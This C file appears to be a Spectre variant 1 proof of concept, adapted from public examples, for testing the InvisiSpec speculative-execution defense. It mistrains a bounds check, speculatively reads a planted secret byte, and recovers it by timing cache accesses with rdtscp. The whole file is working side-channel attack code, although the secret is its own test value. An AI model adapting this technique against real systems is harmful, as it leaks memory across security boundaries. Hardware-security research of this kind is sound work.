#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <x86intrin.h>

/* 
    This code modified from the example given by
    mytbk from https://github.com/mjyan0720/InvisiSpec-1.0/issues/1
    and the example given at
    https://github.com/crozone/SpectrePoC
*/

/*  Our L2 size is 256 KB for the tests, so filling 1MB buffer will
    probably flush everything out of it, but we could get really
    unlucky with virtual memory.
*/
#define LLC_SIZE (2 << 20)

size_t array_size = 4;
uint8_t dummy[LLC_SIZE];
uint8_t array1[200] = {1, 2, 3, 4};
uint8_t array2[256 * 64];
uint8_t X __attribute__ ((section (".non-speculative")));
volatile uint8_t x;

uint8_t victim(size_t idx)
{
	if (idx < array_size) {
		return array2[array1[idx] * 64];
	}
    
    return 0;
}

int main()
{
	unsigned long t[256];
    
    /* make sure array2 will not page fault */
    for(int i = 0; i < 256; i++)
    {
        array2[i*64] = x;
    }

	victim(0);
	victim(0);
	victim(0);
	victim(0);
	victim(0);

	memset(dummy, 1, sizeof(dummy)); // flush L2

	_mm_mfence();

	X = 123; // set the secret value, and also bring it to cache
	size_t attack_idx = &X - array1;
    
	_mm_mfence();
	victim(attack_idx);

    /* Time reads. Order is lightly mixed up to prevent stride prediction */
    for (int i = 0; i < 256; i++) {
        unsigned int junk;
        int mix_i = ((i * 167) + 13) & 255;
        volatile uint8_t * addr = & array2[mix_i * 64];
        unsigned long time1 = __rdtscp( & junk); /* READ TIMER */
        time1 = __rdtscp( & junk); /* READ TIMER */
        junk = * addr; /* MEMORY ACCESS TO TIME */
        /* READ TIMER & COMPUTE ELAPSED TIME */
        unsigned long time2 = __rdtscp( & junk);
        time2 = __rdtscp( & junk);
        t[mix_i] = time2 - time1;
    }

	printf("attack_idx = %ld\n", attack_idx);
	for (int i = 0; i < 256; i++) {
		printf("%d: %ld, %s\n", i, t[i], (t[i] < 40)? "hit": "miss");
	}
    
    return 0;
}
